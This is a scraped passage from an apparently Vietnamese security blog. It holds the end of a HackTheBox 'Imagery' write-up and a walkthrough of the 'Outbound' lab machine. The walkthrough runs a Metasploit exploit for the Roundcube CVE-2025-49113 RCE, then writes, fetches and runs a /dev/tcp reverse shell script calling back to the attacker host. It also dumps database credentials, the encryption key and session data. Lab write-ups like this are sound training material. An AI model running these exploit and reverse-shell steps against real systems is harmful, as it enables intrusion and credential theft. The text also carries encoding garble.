listening on [any] 7777 ... connect to [10.10.14.7] from (UNKNOWN) [10.10.11.88] 40634 bash: cannot set terminal process group (175714): Inappropriate ioctl for device bash: no job control in this shell root@Imagery:~# id id uid=0(root) gid=0(root) groups=0(root) root@Imagery:~# pwd pwd /root root@Imagery:~# ls -la ls -la total 115212 drwx------ 9 root root 4096 Oct 14 05:26 . drwxr-xr-x 20 root root 4096 Sep 22 19:10 .. lrwxrwxrwx 1 root root 9 Sep 22 13:21 .bash_history -\u0026gt; /dev/null -rw-rw-r-- 1 root root 81 Jul 30 08:10 .bash_profile -rw-r--r-- 1 root root 3187 Jul 30 08:10 .bashrc drwxr-xr-x 4 root root 4096 Sep 22 18:56 .cache drwxr-xr-x 2 root root 4096 Oct 14 14:03 .charcol -rw-r--r-- 1 root root 117907496 Aug 1 11:15 chrome.deb drwx------ 3 root root 4096 Sep 22 18:56 .config drwxrwxr-x 3 root root 4096 Sep 22 18:56 .cron -rw------- 1 root root 20 Sep 19 10:00 .lesshst drwxr-xr-x 5 root root 4096 Sep 22 18:56 .local drwx------ 3 root root 4096 Sep 22 18:56 .pki -rw-r----- 1 root root 33 Oct 14 05:26 root.txt -rw-r--r-- 1 root root 66 Sep 22 10:49 .selected_editor drwx------ 2 root root 4096 Sep 22 18:56 .ssh -rw-r--r-- 1 root root 165 Sep 22 13:21 .wget-hsts root@Imagery:~# ","date":"7 October 2025","externalUrl":null,"permalink":"/ctf/hackthebox/imagery/","section":"Ctf","summary":"","title":"Hackthebox - Imagery","type":"ctf"},{"content":"","date":"27 July 2025","externalUrl":null,"permalink":"/tags/cve-2025-27591/","section":"Tags","summary":"","title":"CVE-2025-27591","type":"tags"},{"content":"","date":"27 July 2025","externalUrl":null,"permalink":"/tags/cve-2025-49113/","section":"Tags","summary":"","title":"CVE-2025-49113","type":"tags"},{"content":" Reconnaissance and Scanning # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44= | 256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD 80/tcp open http syn-ack ttl 63 nginx 1.24.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to http://mail.outbound.htb/ |_http-server-header: nginx/1.24.0 (Ubuntu)z Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ThÃªm domain vÃ o file host\nsudo nano /etc/hosts 10.10.11.77 mail.outbound.htb outbound.htb Enumeration and Gaining access # Vhost, directories # Sau khi thá»­ tÃ¬m vhost vá»›i ffuf vÃ  directories vá»›i dirsearch thÃ¬ tÃ´i khÃ´ng nháº­n Ä‘Æ°á»£c báº¥t ká»³ káº¿t quáº£ nÃ o cÃ³ thá»ƒ sá»­ dá»¥ng Ä‘Æ°á»£c.\nPort 80 # Sá»­ dá»¥ng whatweb\nâ”Œâ”€â”€(neoã‰¿fs0ci3ty)-[~] â””â”€$ whatweb http://mail.outbound.htb http://mail.outbound.htb [200 OK] Bootstrap, Content-Language[en], Cookies[roundcube_sessid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], HttpOnly[roundcube_sessid], IP[10.10.11.77], JQuery, PasswordField[_pass], RoundCube, Script, Title[Roundcube Webmail :: Welcome to Roundcube Webmail], X-Frame-Options[sameorigin], nginx[1.24.0] Truy cáº­p web báº±ng trÃ¬nh duyá»‡t, sá»­ dá»¥ng user-pass Ä‘Æ°á»£c cung cáº¥p trÆ°á»›c Ä‘á»ƒ Ä‘Äƒng nháº­p\ntyler:LhKL1o9Nm3X2\nCVE-2025-49113 # TÃ¬m kiáº¿m exploit cá»§a Roubdcube Webmail 1.6.10 tÃ´i nháº­n Ä‘Æ°á»£c káº¿t quáº£ lÃ  CVE-2025-49113. ÄÃ¢y lÃ  má»™t lá»— há»•ng RCE tá»“n táº¡i trÃªn Roundcube webmail tá»« phiÃªn báº£n 1.5.0 Ä‘áº¿n 1.6.10, lá»— há»•ng cho phÃ©p káº» táº¥n cÃ´ng thá»±c thi mÃ£ tá»« xa trÃªn server, chá»‰ cáº§n cÃ³ tÃ i khoáº£n Ä‘Äƒng nháº­p webmail.\nPhÃ¢n tÃ­ch má»™t chÃºt vá» lá»— há»•ng nÃ y trÃªn exploit-db thÃ¬ nÃ³ Ä‘Ã£ cÃ³ phiÃªn báº£n cho metasploit. TÃ´i sáº½ táº£i nÃ³ vá» vÃ  import nÃ³ vÃ o msf cá»§a mÃ¬nh.\nÄáº§u tiÃªn, táº£i payload vá» thÆ° má»¥c cá»§a metasploit\nâ”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ cd /usr/share/metasploit-framework/modules/exploits/multi/http â”Œâ”€â”€(kaliã‰¿kali)-[/usr/â€¦/modules/exploits/multi/http] â””â”€$ sudo wget https://www.exploit-db.com/download/52324 -O roundcube_auth_rce_cve_2025_49113.rb --2025-08-01 03:40:55-- https://www.exploit-db.com/exploits/52324 Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13 Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected. HTTP request sent, awaiting response... 200 OK Length: unspecified [text/html] Saving to: â€˜roundcube_auth_rce_cve_2025_49113.rbâ€™ roundcube_auth_rce_cve_2025_49113.rb [ \u0026lt;=\u0026gt; ] 147.20K 238KB/s in 0.6s 2025-08-01 03:40:57 (238 KB/s) - â€˜roundcube_auth_rce_cve_2025_49113.rbâ€™ saved [150728] Báº­t msfconsole vÃ  reload láº¡i modules\nâ”Œâ”€â”€(kaliã‰¿kali)-[/usr/â€¦/modules/exploits/multi/http] â””â”€$ msfconsole -q msf6 \u0026gt; reload_all [*] Reloading modules from all module paths... [-] Unknown command: reload. Did you mean load? Run the help command for more details. .,,. . .\\$$$$$L..,,==aaccaacc%#s$b. d8, d8P d8P #$$$$$$$$$$$$$$$$$$$$$$$$$$$b. `BP d888888p d888888P \u0026#39;7$$$$\\\u0026#34;\u0026#34;\u0026#34;\u0026#34;\u0026#39;\u0026#39;^^`` .7$$$|D*\u0026#34;\u0026#39;``` ?88\u0026#39; d8bd8b.d8p d8888b ?88\u0026#39; d888b8b _.os#$|8*\u0026#34;` d8P ?8b 88P 88P`?P\u0026#39;?P d8b_,dP 88P d8P\u0026#39; ?88 .oaS###S*\u0026#34;` d8P d8888b $whi?88b 88b d88 d8 ?8 88b 88b 88b ,88b .osS$$$$*\u0026#34; ?88,.d88b, d88 d8P\u0026#39; ?88 88P `?8b d88\u0026#39; d88b 8b`?8888P\u0026#39;`?8b`?88P\u0026#39;.aS$$$$Q*\u0026#34;` `?88\u0026#39; ?88 ?88 88b d88 d88 .a#$$$$$$\u0026#34;` 88b d8P 88b`?8888P\u0026#39; ,s$$$$$$$\u0026#34;` 888888P\u0026#39; 88n _.,,,ass;: .a$$$$$$$P` d88P\u0026#39; .,.ass%#S$$$$$$$$$$$$$$\u0026#39; .a$###$$$P` _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$\u0026#39; ,a$$###$$P` _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS\u0026#39; .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--\u0026#34;\u0026#34;\u0026#39;\u0026#39;^^/$$$$$$\u0026#39; _______________________________________________________________ ,\u0026amp;$$$$$$\u0026#39;_____ ll\u0026amp;\u0026amp;$$$$\u0026#39; .;;lll\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026#39; ...;;lllll\u0026amp;\u0026#39; ......;;;llll;;;.... ` ......;;;;... . . =[ metasploit v6.4.64-dev ] + -- --=[ 2520 exploits - 1296 auxiliary - 431 post ] + -- --=[ 1610 payloads - 49 encoders - 13 nops ] + -- --=[ 9 evasion ] Metasploit Documentation: https://docs.metasploit.com/ Kiá»ƒm tra láº¡i module vÃ  setup payload\nmsf6 \u0026gt; search roundcube Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/gather/roundcube_auth_file_read 2017-11-09 normal No Roundcube TimeZone Authenticated File Disclosure 1 exploit/multi/http/roundcube_auth_rce_cve_2025_49113 2025-06-02 excellent Yes Roundcube â‰¤ 1.6.10 Post-Auth RCE via PHP Object Deserialization 2 \\_ target: Linux Dropper . . . . 3 \\_ target: Linux Command . . . . Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/roundcube_auth_rce_cve_2025_49113 After interacting with a module you can manually set a TARGET with set TARGET \u0026#39;Linux Command\u0026#39; msf6 \u0026gt; use 3 [*] Additionally setting TARGET =\u0026gt; Linux Command [*] Using configured payload cmd/unix/reverse_bash msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) \u0026gt; options Module options (exploit/multi/http/roundcube_auth_rce_cve_2025_49113): Name Current Setting Required Description ---- --------------- -------- ----------- HOST no The hostname of Roundcube server PASSWORD yes Password to login with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI / yes The URI of the Roundcube Application URIPATH no The URI to use for this exploit (default is random) USERNAME yes Email User to login with VHOST no HTTP server virtual host When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http: Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. Payload options (cmd/unix/reverse_bash): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 1 Linux Command View the full module info with the info, or info -d command. msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) \u0026gt; set host mail.outbound.htb host =\u0026gt; mail.outbound.htb msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) \u0026gt; set username tyler username =\u0026gt; tyler msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) \u0026gt; set password `tyler:LhKL1o9Nm3X2` password =\u0026gt; `tyler:LhKL1o9Nm3X2` msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) \u0026gt; set password LhKL1o9Nm3X2 password =\u0026gt; LhKL1o9Nm3X2 msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) \u0026gt; set lhost tun0 lhost =\u0026gt; 10.10.14.61 msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) \u0026gt; run [-] Msf::OptionValidateError One or more options failed to validate: RHOSTS. msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) \u0026gt; set rhosts mail.outbound.htb rhosts =\u0026gt; mail.outbound.htb msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.61:4444 [*] Running automatic check (\u0026#34;set AutoCheck false\u0026#34; to disable) [+] Extracted version: 10610 [+] The target appears to be vulnerable. [*] Fetching CSRF token... [+] Extracted token: mTWgKqeFiXho2nnC9ve1chryup8SHHtN [*] Attempting login... [+] Login successful. [*] Preparing payload... [+] Payload successfully generated and serialized. [*] Uploading malicious payload... [+] Exploit attempt complete. Check for session. [*] Command shell session 1 opened (10.10.14.61:4444 -\u0026gt; 10.10.11.77:36418) at 2025-08-01 15:47:31 +0700 Bingo!!!\nTÃ´i sáº½ up thÃªm 1 reverse shell Ä‘á»ƒ giá»¯ káº¿t ná»‘i vÃ  upgrade shell, thuáº­n tiá»‡n hÆ¡n cho viá»‡c khai thÃ¡c.\nnano revshell.sh /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.61/9001 0\u0026gt;\u0026amp;1 â”Œâ”€â”€(neoã‰¿fs0ci3ty)-[~] â””â”€$ python3 -m http.server 8000 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Quay trá»Ÿ láº¡i bÃªn msfconsole, tÃ´i sáº½ táº£i reverse shell lÃªn Ä‘Ã¢y\nid uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/bash pwd / ls -la /var/www/html total 28 drwxr-xr-x 1 root root 4096 Jun 6 18:55 . drwxr-xr-x 1 root root 4096 Jun 6 18:55 .. -rw-r--r-- 1 root root 615 Jun 6 18:55 index.nginx-debian.html drwxr-xr-x 1 www-data www-data 4096 Jun 6 18:55 roundcube cd /var/www/html/roundcube script -qc /bin/bash /dev/null www-data@mail:/var/www/html/roundcube$ www-data@mail:/var/www/html/roundcube$ wget http://10.10.14.61:8000/revshell.sh \u0026lt;roundcube$ wget http://10.10.14.61:8000/revshell.sh --2025-08-01 08:43:50-- http://10.10.14.61:8000/revshell.sh Connecting to 10.10.14.61:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 47 [text/x-sh] Saving to: \u0026#39;revshell.sh\u0026#39; revshell.sh 100%[===================\u0026gt;] 47 --.-KB/s in 0s 2025-08-01 08:43:50 (5.33 MB/s) - \u0026#39;revshell.sh\u0026#39; saved [47/47] TrÆ°á»›c khi cháº¡y shell thÃ¬ báº­t listener\nâ”Œâ”€â”€(neoã‰¿fs0ci3ty)-[~] â””â”€$ rlwrap nc -lnvp 9001 listening on [any] 9001 ... www-data@mail:/var/www/html/roundcube$ chmod +x revshell.sh chmod +x revshell.sh www-data@mail:/var/www/html/roundcube$ ./revshell.sh ./revshell.sh Quay trá»Ÿ láº¡i listener\nâ”Œâ”€â”€(neoã‰¿fs0ci3ty)-[~] â””â”€$ rlwrap nc -lnvp 9001 listening on [any] 9001 ... connect to [10.10.14.61] from (UNKNOWN) [10.10.11.77] 45566 www-data@mail:/var/www/html/roundcube$ www-data@mail:/var/www/html/roundcube$ script -qc /bin/bash /dev/null script -qc /bin/bash /dev/null www-data@mail:/var/www/html/roundcube$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@mail:/var/www/html/roundcube$ ls -la ls -la total 1392 drwxr-xr-x 1 www-data www-data 4096 Aug 1 08:43 . drwxr-xr-x 1 root root 4096 Jun 6 18:55 .. -rw-r--r-- 1 www-data www-data 2553 Feb 8 08:47 .htaccess -rw-r--r-- 1 www-data www-data 216244 Feb 8 08:47 CHANGELOG.md -rw-r--r-- 1 www-data www-data 12714 Feb 8 08:47 INSTALL -rw-r--r-- 1 www-data www-data 35147 Feb 8 08:47 LICENSE -rw-r--r-- 1 www-data www-data 3853 Feb 8 08:47 README.md -rw-r--r-- 1 www-data www-data 1049 Feb 8 08:47 SECURITY.md drwxr-xr-x 7 www-data www-data 4096 Feb 8 08:47 SQL -rw-r--r-- 1 www-data www-data 4657 Feb 8 08:47 UPGRADING drwxr-xr-x 2 www-data www-data 4096 Feb 8 08:47 bin -rw-r--r-- 1 www-data www-data 1086 Feb 8 08:47 composer.json -rw-r--r-- 1 www-data www-data 56802 Feb 8 08:47 composer.lock drwxr-xr-x 2 www-data www-data 4096 Jun 6 18:55 config -rw-r--r-- 1 www-data www-data 11200 Feb 8 08:47 index.php -rw-r--r-- 1 www-data www-data 956174 Jul 1 14:58 lin.sh drwxr-xr-x 1 www-data www-data 4096 Jun 11 07:46 logs -rwxr-xr-x 1 www-data www-data 35032 Jul 17 13:52 nc drwxr-xr-x 37 www-data www-data 4096 Feb 8 08:47 plugins drwxr-xr-x 8 www-data www-data 4096 Feb 8 08:47 program drwxr-xr-x 3 www-data www-data 4096 Jun 6 18:55 public_html -rwxr-xr-x 1 www-data www-data 47 Aug 1 2025 revshell.sh drwxr-xr-x 3 www-data www-data 4096 Feb 8 08:47 skins drwxr-xr-x 1 www-data www-data 4096 Aug 1 08:45 temp drwxr-xr-x 14 www-data www-data 4096 Feb 8 08:47 vendor -rw-r--r-- 1 www-data www-data 653 Aug 1 08:39 wget-log Sau khi ngá»“i nghiÃªn cá»©u source cá»§a Roundcubemail trÃªn github vÃ  káº¿t há»£p vá»›i nhá»¯ng gÃ¬ Ä‘ang cÃ³, tÃ´i tÃ¬m tháº¥y pháº§n config cá»§a DB trong thÆ° má»¥c config.\nwww-data@mail:/var/www/html/roundcube$ cat config/config.inc.php cat config/config.inc.php \u0026lt;?php /* +-----------------------------------------------------------------------+ | Local configuration for the Roundcube Webmail installation. | | | | This is a sample configuration file only containing the minimum | | setup required for a functional installation. Copy more options | | from defaults.inc.php to this file to override the defaults. | | | | This file is part of the Roundcube Webmail client | | Copyright (C) The Roundcube Dev Team | | | | Licensed under the GNU General Public License version 3 or | | any later version with exceptions for skins \u0026amp; plugins. | | See the README file for a full license statement. | +-----------------------------------------------------------------------+ */ $config = []; // Database connection string (DSN) for read+write operations // Format (compatible with PEAR MDB2): db_provider://user:password@host/database // Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle // For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php // NOTE: for SQLite use absolute path (Linux): \u0026#39;sqlite:////full/path/to/sqlite.db?mode=0646\u0026#39; // or (Windows): \u0026#39;sqlite:///C:/full/path/to/sqlite.db\u0026#39; $config[\u0026#39;db_dsnw\u0026#39;] = \u0026#39;mysql://roundcube:**********@localhost/roundcube\u0026#39;; // IMAP host chosen to perform the log-in. // See defaults.inc.php for the option description. $config[\u0026#39;imap_host\u0026#39;] = \u0026#39;localhost:143\u0026#39;; // SMTP server host (for sending mails). // See defaults.inc.php for the option description. $config[\u0026#39;smtp_host\u0026#39;] = \u0026#39;localhost:587\u0026#39;; // SMTP username (if required) if you use %u as the username Roundcube // will use the current username for login $config[\u0026#39;smtp_user\u0026#39;] = \u0026#39;%u\u0026#39;; // SMTP password (if required) if you use %p as the password Roundcube // will use the current user\u0026#39;s password for login $config[\u0026#39;smtp_pass\u0026#39;] = \u0026#39;%p\u0026#39;; // provide an URL where a user can get support for this Roundcube installation // PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE! $config[\u0026#39;support_url\u0026#39;] = \u0026#39;\u0026#39;; // Name your service. This is displayed on the login screen and in the window title $config[\u0026#39;product_name\u0026#39;] = \u0026#39;Roundcube Webmail\u0026#39;; // This key is used to encrypt the users imap password which is stored // in the session record. For the default cipher method it must be // exactly 24 characters long. // YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS $config[\u0026#39;des_key\u0026#39;] = \u0026#39;rcmail-!24ByteDESkey*Str\u0026#39;; // List of active plugins (in plugins/ directory) $config[\u0026#39;plugins\u0026#39;] = [ \u0026#39;archive\u0026#39;, \u0026#39;zipdownload\u0026#39;, ]; // skin name: folder from skins/ $config[\u0026#39;skin\u0026#39;] = \u0026#39;elastic\u0026#39;; $config[\u0026#39;default_host\u0026#39;] = \u0026#39;localhost\u0026#39;; $config[\u0026#39;smtp_server\u0026#39;] = \u0026#39;localhost\u0026#39;; TrÆ°á»›c khi truy cáº­p DB thÃ¬ tÃ´i muá»‘n note láº¡i má»™t sá»‘ thÃ´ng tin vá» tháº±ng Roundcubemail nÃ y.\nVá» cÆ¡ báº£n thÃ¬ vÃ¬ nÃ³ lÃ  1 mail server nÃªn lÃ  nÃ³ cÃ³ smtp, cÃ³ imap vÃ  sá»­ dá»¥ng mysql lÃ m DB. Tuy nhiÃªn, Roundcubemail khÃ´ng lÆ°u thÃ´ng tin Ä‘Äƒng nháº­p cá»§a user trong DB, nÃ³ chá»‰ giá»¯ trong session Ä‘á»ƒ duy trÃ¬ káº¿t ná»‘i IMAP vÃ  SMTP.\nMá»™t pháº§n ná»¯a Ä‘Ã¡ng chÃº Ã½ lÃ  mÃ£ hÃ³a\n$config[\u0026#39;des_key\u0026#39;] = \u0026#39;rcmail-!24ByteDESkey*Str\u0026#39;; ÄÃ¢y lÃ  khÃ³a mÃ£ hÃ³a Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ mÃ£ hÃ³a máº­t kháº©u ngÆ°á»i dÃ¹ng trong session. Náº¿u key nÃ y bá»‹ lá»™, tÃ´i cÃ³ thá»ƒ giáº£i mÃ£ cÃ¡c session Ä‘Æ°á»£c lÆ°u trong DB vÃ  láº¥y láº¡i máº­t kháº©u IMAP.\nNgoÃ i ra, bÃªn trong source trÃªn github tÃ´i cÅ©ng tÃ¬m tháº¥y decrypt.sh, cÃ³ thá»ƒ lÃ  Ä‘á»ƒ giáº£i mÃ£ session.\nÄÄƒng nháº­p DB\nwww-data@mail:/var/www/html/roundcube$ mysql -u roundcube -p******** roundcube \u0026lt;ndcube$ mysql -u roundcube -p******** roundcube Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 42567 Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. MariaDB [roundcube]\u0026gt; show tables; show tables; +---------------------+ | Tables_in_roundcube | +---------------------+ | cache | | cache_index | | cache_messages | | cache_shared | | cache_thread | | collected_addresses | | contactgroupmembers | | contactgroups | | contacts | | dictionary | | filestore | | identities | | responses | | searches | | session | | system | | users | +---------------------+ 17 rows in set (0.000 sec) MariaDB [roundcube]\u0026gt; select * from session; select * from session; +----------------------------+---------------------+------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | sess_id | changed | ip | vars | +----------------------------+---------------------+------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ | | 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1s*************** | +----------------------------+---------------------+------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ 8 rows in set (0.000 sec) MariaDB [roundcube]\u0026gt; Thá»­ decode báº±ng 